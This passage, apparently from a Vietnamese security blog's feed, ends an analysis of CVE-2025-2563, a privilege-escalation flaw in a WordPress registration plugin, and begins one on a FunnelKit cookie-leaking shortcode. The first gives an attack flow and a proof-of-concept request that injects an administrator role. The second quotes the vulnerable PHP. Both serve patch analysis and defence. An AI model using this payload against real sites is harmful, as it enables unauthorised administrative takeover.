t·ª± truy·ªÅn role ƒë·ªÉ ghi ƒë√®&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;get_single_membership_by_ID()&lt;/code&gt; truy v·∫•n tr·ª±c ti·∫øp database ƒë·ªÉ l·∫•y th√¥ng tin membership v√† &lt;code&gt;meta_value&lt;/code&gt; t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;meta_key = &#39;ur_membership&#39;&lt;/code&gt;, ƒë·∫£m b·∫£o role ƒë∆∞·ª£c l·∫•y t·ª´ &lt;strong&gt;ngu·ªìn d·ªØ li·ªáu tin c·∫≠y (server-side)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;K·∫øt qu·∫£: &lt;strong&gt;l·ªó h·ªïng leo thang ƒë·∫∑c quy·ªÅn ƒë√£ ƒë∆∞·ª£c kh·∫Øc ph·ª•c&lt;/strong&gt;, v√¨ role ch·ªâ c√≥ th·ªÉ ƒë∆∞·ª£c c·∫•u h√¨nh b·ªüi qu·∫£n tr·ªã vi√™n khi t·∫°o membership, kh√¥ng c√≤n b·ªã ƒëi·ªÅu khi·ªÉn b·ªüi request t·ª´ client.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access /membership-registration/ to obtain nonce&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Nonce (_nonce) returned in ur_membership_frontend_localized_data&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Submit registration form&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Request sent to /wp-admin/admin-ajax.php action=user_registration_user_form_submit&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;User account created&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Second request sent to /wp-admin/admin-ajax.php action=user_registration_membership_register_member&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Attacker intercepts request and injects role=administrator into members_data&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;register_member() verifies nonce only&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;prepare_members_data() trusts client-supplied role&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;update_user_meta() calls WP_User::set_role(role)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;New account is assigned Administrator role&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Attacker logs in with newly created account&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Full administrative privileges obtained&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy c·∫≠p endpoint ƒëƒÉng k√Ω membership (&lt;code&gt;/membership-registration/&lt;/code&gt;) v√† ti·∫øn h√†nh ƒëƒÉng k√Ω, b·∫≠t &lt;strong&gt;Burp Intercept&lt;/strong&gt; ƒë·ªÉ ch·∫∑n request.&lt;/li&gt;&#xA;&lt;li&gt;Forward c√°c request cho ƒë·∫øn khi g·∫∑p request c√≥ action &lt;strong&gt;&lt;code&gt;user_registration_membership_register_member&lt;/code&gt;&lt;/strong&gt;, sau ƒë√≥ ch·ªânh s·ª≠a tham s·ªë &lt;strong&gt;&lt;code&gt;members_data&lt;/code&gt;&lt;/strong&gt; b·∫±ng c√°ch th√™m &lt;strong&gt;&lt;code&gt;&amp;quot;role&amp;quot;:&amp;quot;administrator&amp;quot;&lt;/code&gt;&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;membership&amp;#34;:&amp;#34;406&amp;#34;,&amp;#34;total&amp;#34;:&amp;#34;0&amp;#34;,&amp;#34;payment_method&amp;#34;:&amp;#34;free&amp;#34;,&amp;#34;start_date&amp;#34;:&amp;#34;2026-1-7&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;hacker&amp;#34;,&amp;#34;role&amp;#34;:&amp;#34;administrator&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Forward request ƒë√£ ch·ªânh s·ª≠a.&lt;/li&gt;&#xA;&lt;li&gt;ƒêƒÉng nh·∫≠p b·∫±ng t√†i kho·∫£n v·ª´a t·∫°o v√† ki·ªÉm tra quy·ªÅn truy c·∫≠p.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-2563 xu·∫•t ph√°t t·ª´ vi·ªác plugin cho ph√©p endpoint AJAX c√¥ng khai x·ª≠ l√Ω ƒëƒÉng k√Ω membership nh∆∞ng &lt;strong&gt;tin t∆∞·ªüng tr·ª±c ti·∫øp d·ªØ li·ªáu do client g·ª≠i l√™n&lt;/strong&gt;, ƒë·∫∑c bi·ªát l√† tham s·ªë &lt;code&gt;role&lt;/code&gt;. Do kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ho·∫∑c whitelist role h·ª£p l·ªá, attacker ch∆∞a x√°c th·ª±c c√≥ th·ªÉ ch√®n gi√° tr·ªã &lt;code&gt;administrator&lt;/code&gt; v√†o request v√† ƒë∆∞·ª£c h·ªá th·ªëng g√°n quy·ªÅn qu·∫£n tr·ªã th√¥ng qua &lt;code&gt;WP_User::set_role()&lt;/code&gt;.&#xA;B·∫£n v√° ·ªü phi√™n b·∫£n 4.1.2 ƒë√£ kh·∫Øc ph·ª•c tri·ªát ƒë·ªÉ b·∫±ng c√°ch &lt;strong&gt;lo·∫°i b·ªè ho√†n to√†n vi·ªác l·∫•y role t·ª´ request&lt;/strong&gt;, ch·ªâ s·ª≠ d·ª•ng role ƒë∆∞·ª£c c·∫•u h√¨nh trong metadata c·ªßa membership tr√™n server, t·ª´ ƒë√≥ ngƒÉn ch·∫∑n kh·∫£ nƒÉng leo thang ƒë·∫∑c quy·ªÅn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù tin t∆∞·ªüng d·ªØ li·ªáu ƒë·∫ßu v√†o t·ª´ client cho c√°c thu·ªôc t√≠nh nh·∫°y c·∫£m nh∆∞ &lt;strong&gt;role / privilege&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;C√°c endpoint c√¥ng khai (&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;) c·∫ßn ƒë∆∞·ª£c ƒë√°nh gi√° k·ªπ v·ªÅ &lt;strong&gt;quy·ªÅn truy c·∫≠p v√† ph·∫°m vi t√°c ƒë·ªông&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nonce ch·ªâ gi√∫p ch·ªëng CSRF, &lt;strong&gt;kh√¥ng thay th·∫ø cho ki·ªÉm so√°t ph√¢n quy·ªÅn v√† validate d·ªØ li·ªáu&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n √°p d·ª•ng &lt;strong&gt;server-side validation v√† whitelist&lt;/strong&gt; cho c√°c gi√° tr·ªã ·∫£nh h∆∞·ªüng ƒë·∫øn quy·ªÅn h·∫°n h·ªá th·ªëng.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác so s√°nh diff gi·ªØa c√°c phi√™n b·∫£n l√† ph∆∞∆°ng ph√°p hi·ªáu qu·∫£ ƒë·ªÉ x√°c ƒë·ªãnh &lt;strong&gt;nguy√™n nh√¢n g·ªëc r·ªÖ v√† c√°ch b·∫£n v√° x·ª≠ l√Ω l·ªó h·ªïng&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-1-2-unauthenticated-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin &amp;lt; 4.1.2 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-7654 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-06-cve-2025-7654/</link>
      <pubDate>Tue, 06 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-06-cve-2025-7654/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nhi·ªÅu plugin c·ªßa &lt;strong&gt;FunnelKit&lt;/strong&gt; trong c√°c phi√™n b·∫£n kh√°c nhau t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;ti·∫øt l·ªô th√¥ng tin nh·∫°y c·∫£m&lt;/strong&gt;, c√≥ th·ªÉ d·∫´n ƒë·∫øn &lt;strong&gt;leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt;, th√¥ng qua th∆∞ vi·ªán &lt;strong&gt;WooFunnels&lt;/strong&gt;.&#xA;L·ªó h·ªïng n√†y cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p v·ªõi quy·ªÅn Contributor (C·ªông t√°c vi√™n) tr·ªü l√™n&lt;/strong&gt; c√≥ th·ªÉ truy c·∫≠p v√† khai th√°c m·ªôt ch·ª©c nƒÉng trong th∆∞ vi·ªán WooFunnels ƒë·ªÉ &lt;strong&gt;l·∫•y c√°c th√¥ng tin nh·∫°y c·∫£m&lt;/strong&gt;, bao g·ªìm &lt;strong&gt;cookie x√°c th·ª±c&lt;/strong&gt; c·ªßa ng∆∞·ªùi d√πng kh√°c.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-7654&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-7654&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.11.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Funnel Builder by FunnelKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Funnel Builder by FunnelKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.0.2&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.12.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;ul&gt;&#xA;&lt;li&gt;M·∫∑c d√π CVE ƒë∆∞·ª£c c√¥ng b·ªë cho r·∫±ng l·ªó h·ªïng ƒë√£ ƒë∆∞·ª£c v√° trong phi√™n b·∫£n &lt;code&gt;3.11.1&lt;/code&gt;, nh∆∞ng tr√™n th·ª±c t·∫ø b·∫£n v√° ch·ªâ th·ª±c s·ª± ƒë∆∞·ª£c √°p d·ª•ng ƒë·∫ßy ƒë·ªß k·ªÉ t·ª´ phi√™n b·∫£n &lt;code&gt;3.12.0&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&lt;ul&gt;&#xA;&lt;li&gt;Plugin &lt;strong&gt;y√™u c·∫ßu WooCommerce ƒë·ªÉ ho·∫°t ƒë·ªông&lt;/strong&gt;, do ƒë∆∞·ª£c &lt;strong&gt;t√≠ch h·ª£p v√† ph·ª• thu·ªôc tr·ª±c ti·∫øp v√†o WooCommerce&lt;/strong&gt;; ch·ªâ c√≥ th·ªÉ ƒë∆∞·ª£c k√≠ch ho·∫°t khi &lt;strong&gt;WooCommerce&lt;/strong&gt; ƒë√£ ƒë∆∞·ª£c c√†i ƒë·∫∑t v√† k√≠ch ho·∫°t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω c√°c shortcode nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public $shortcodes = array(&#xA;    &amp;#39;get_cookie&amp;#39;,&#xA;    &amp;#39;get_url_parameter&amp;#39;,&#xA;);&#xA;&#xA;public function __construct() {&#xA;    foreach ( $this-&amp;gt;shortcodes as $code ) {&#xA;        add_shortcode( &amp;#39;wf_&amp;#39; . $code, array( $this, $code ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi c·∫•u h√¨nh n√†y, plugin t·∫°o ra hai shortcode t∆∞∆°ng ·ª©ng v·ªõi hai h√†m callback ƒë·ªÉ x·ª≠ l√Ω:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; ‚Üí callback &lt;code&gt;get_cookie&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Shortcode &lt;code&gt;wf_get_url_parameter&lt;/code&gt; ‚Üí callback &lt;code&gt;get_url_parameter&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trong ƒë√≥, shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; tr·ª±c ti·∫øp li√™n quan ƒë·∫øn l·ªó h·ªïng b·∫£o m·∫≠t.&lt;/p&gt;&#xA;&lt;p&gt;Khi shortcode n√†y ƒë∆∞·ª£c nh√∫ng v√†o b√†i vi·∫øt ho·∫∑c trang, callback &lt;code&gt;get_cookie&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_cookie( $attr ) {&#xA;    $attr = shortcode_atts( array(&#xA;        &amp;#39;key&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;    ), $attr );&#xA;&#xA;    if ( empty( $attr[&amp;#39;key&amp;#39;] ) ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $data = isset( $_COOKIE[ $attr[&amp;#39;key&amp;#39;] ] ) ? bwf_clean( $_COOKIE[ $attr[&amp;#39;key&amp;#39;] ] ) : &amp;#39;&amp;#39;;&#xA;&#xA;    /*** read cookie when drop cookie on page **/&#xA;    if ( empty( $data ) ) {&#xA;        $key  = str_replace( &amp;#39;bwf_&amp;#39;, &amp;#39;&amp;#39;, $attr[&amp;#39;key&amp;#39;] );&#xA;        $data = isset( $_GET[ $key ] ) ? bwf_clean( $_GET[ $key ] ) : &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;get_cookie&lt;/code&gt; cho ph√©p ƒë·ªçc tr·ª±c ti·∫øp gi√° tr·ªã cookie t·ª´ bi·∫øn to√†n c·ª•c &lt;code&gt;$_COOKIE&lt;/code&gt; v√† g√°n v√†o 